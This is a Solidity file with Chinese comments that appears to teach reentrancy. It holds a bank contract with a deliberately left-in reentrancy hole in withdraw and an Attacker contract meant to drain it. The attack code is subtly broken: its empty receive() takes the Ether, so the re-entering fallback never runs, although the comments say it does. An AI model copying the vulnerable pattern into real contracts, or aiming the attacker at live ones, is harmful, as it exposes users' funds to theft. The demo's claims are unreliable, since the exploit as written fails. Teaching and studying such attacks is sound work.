pragma solidity >=0.8.0;

// SPDX-License-Identifier: UNLICENSED

// VulnerableBank 合約：存在 reentrancy（重入）漏洞
// 漏洞重點在 withdraw 函數，先呼叫外部函式（轉帳）後才更新狀態變數 balances，可能被重入利用

contract VulnerableBank {
    mapping(address => uint256) public balances; // 狀態變數，記錄每個地址的餘額

    // 存入 Ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞函式 withdraw：
    // 1. 先取得使用者餘額
    // 2. 執行外部 call 傳送 Ether，未先更新狀態變數
    // 3. 更新使用者餘額為 0
    // 此順序使得攻擊者可在轉帳過程中不斷呼叫 withdraw 進行重入攻擊
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        // Vulnerable 風險：外部呼叫，可能觸發重入攻擊
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // 狀態變數更新在外部 call 後執行
        balances[msg.sender] = 0; // 漏洞部分：狀態變數修改位置不當
    }

    // 定義 receive 函數以接收 Ether，避免警告
    receive() external payable {}
}

// 攻擊合約 Attacker
// 攻擊步驟:
// 1. 攻擊者部署 Attacker 合約，傳入 VulnerableBank 合約地址（需為 payable address）
// 2. 攻擊者透過 attack() 函數存入至少 1 Ether 並呼叫 vulnerable.withdraw()，觸發 withdraw 中的 call
// 3. 在 Attacker 的 fallback 中再次呼叫 vulnerable.withdraw() 進行重入，直到資金耗盡

contract Attacker {
    VulnerableBank public vulnerable;
    uint256 public attackCount = 0;

    // 將構造子參數型態改為 address payable 以避免型別轉換錯誤
    constructor(address payable _vulnerable) {
        // 將 _vulnerable 轉型為 VulnerableBank 合約實例
        vulnerable = VulnerableBank(_vulnerable);
    }

    // 初始化攻擊：存入 Ether 並呼叫 withdraw
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether");
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    // receive 函數用來接收 Ether，避免 fallback 混淆
    receive() external payable {}

    // fallback 被呼叫時觸發重入
    fallback() external payable {
        // 條件限制：剩餘餘額足夠且攻擊次數未超過 3 次（避免無限循環，僅作示範）
        if (address(vulnerable).balance >= 1 ether && attackCount < 3) {
            attackCount += 1;
            vulnerable.withdraw();
        }
    }
}
